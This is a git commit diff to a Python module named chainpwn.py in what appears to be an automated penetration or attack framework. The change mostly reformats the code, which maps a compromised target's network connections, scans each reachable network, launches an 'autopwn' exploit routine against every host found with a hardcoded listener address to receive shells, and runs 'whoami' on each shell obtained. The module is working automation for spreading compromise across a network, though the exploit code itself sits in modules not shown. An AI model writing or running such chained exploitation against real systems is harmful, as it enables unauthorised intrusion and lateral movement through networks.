a22ddfc63810ff1df0c2612d1501c5a53a419a34
Célian DEBÉTHUNE <67879047+CeliTop@users.noreply.github.com>
2024-02-19 10:31:50 +0100

    fix scanNetwork

--- modules/chainpwn.py
+++ modules/chainpwn.py
@@ -3,24 +3,24 @@
 import autopwn as apwn
 import post.postexploit as pexp
 
-def chainpwn()->int:
+
+def chainpwn() -> int:
     connections = pexp.getTargetConnections()
     print(f"@IP found for current target : {connections}")
     netlist = pexp.machine_to_rzo(ip_list=connections)
     for net in netlist:
         print(f"Scanning following network {net}...")
-        hosts = pexp.scanNetwork(net,
-                                 mask8=False,
-                                 mask16=False,
-                                 mask24=True)
+        hosts = pexp.scanNetwork(net)
         print(f"These hosts have been found {hosts}")
         for h in hosts:
-            (shell, client, srv) = apwn.autopwn(Rhosts=h,
-                                                Lhost="192.168.1.86",
-                                                generic_exploit=True,
-                                                get_edb_exploits=False,
-                                                com_and_cont=False,
-                                                auto_mode=True)
+            (shell, client, srv) = apwn.autopwn(
+                Rhosts=h,
+                Lhost="192.168.1.86",
+                generic_exploit=True,
+                get_edb_exploits=False,
+                com_and_cont=False,
+                auto_mode=True,
+            )
             if shell:
-                apwn.sendCommands(shell,["whoami"])
+                apwn.sendCommands(shell, ["whoami"])
     return 0
